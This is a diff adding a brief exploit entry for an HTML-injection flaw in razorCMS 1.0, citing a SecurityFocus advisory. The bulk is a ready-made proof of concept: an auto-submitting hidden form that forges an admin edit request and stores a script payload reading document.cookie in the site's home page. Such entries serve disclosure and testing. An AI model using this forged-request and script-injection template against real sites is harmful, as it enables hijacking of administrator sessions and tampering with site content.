@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/40373/info
+
+razorCMS is prone to an HTML-injection vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials and to control how the site is rendered to the user; other attacks are also possible.
+
+razorCMS 1.0 Stable is vulnerable; other versions may also be affected. 
+
+<form action="http://www.example.com/admin/?action=edit&slab=home" method="post" name="main" > <input type="hidden" name="title" value="Home" /> <input name="content" type="hidden" value='hello"><script>alert("2"+document.cookie)</script>' /> <input type="hidden" name="ptitle" value="" /> <input type="hidden" name="theme" value="theme-default" /> <input type="hidden" name="check_sidebar" value="sidebar" /> <input type="hidden" name="save" value="Save Content" /> </form> <script> document.main.submit(); </script> 
